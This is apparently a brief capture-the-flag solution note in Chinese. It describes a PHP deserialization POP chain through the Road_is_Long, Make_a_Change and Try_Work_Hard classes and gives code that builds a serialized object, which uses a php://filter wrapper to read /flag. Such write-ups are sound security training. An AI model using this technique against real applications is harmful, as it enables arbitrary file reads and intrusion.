# 思路
	- 简单POP, 注意flag在根目录的`/flag`下
	- ```
	  Road_is_Long:: __wakeup -->
	  Road_is_Long:: __toString -->
	  Make_a_Change:: __get -->
	  Try_Work_Hard:: __invoke -->
	  Try_Work_Hard:: append
	  ```
	- ```php
	  $payload = "php://filter/read=convert.base64-encode/resource=/flag";
	  $o5 = new Try_Work_Hard();
	  $o5 -> setvar($payload);
	  $o3 = new Make_a_Change();
	  $o3 -> effort = $o5;
	  $o2 = new Road_is_Long();
	  $o2 -> string = $o3;
	  $o1 = new Road_is_Long();
	  $o1 -> page = $o2;
	  echo urlencode(serialize($o1));
	  
	  ```
-